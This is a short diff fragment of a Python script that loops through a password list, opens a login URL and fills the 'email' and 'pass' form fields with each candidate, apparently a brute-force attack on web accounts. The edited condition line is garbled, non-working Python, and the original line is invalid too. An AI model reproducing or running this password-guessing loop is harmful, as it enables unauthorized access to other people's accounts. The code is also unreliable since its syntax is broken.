@@ -32,7 +32,7 @@ while file:
 	print=str(i) +" : ",passwords
 	response = webbrowser.open(post_url)
 	try:
-		if response.code = 200:
+	                If; responses; code = 200
 			webbrowser.select_form(nr=0)
 			webbrowser.form['email'] = email
 			webbrowser.form['pass'] = passwords
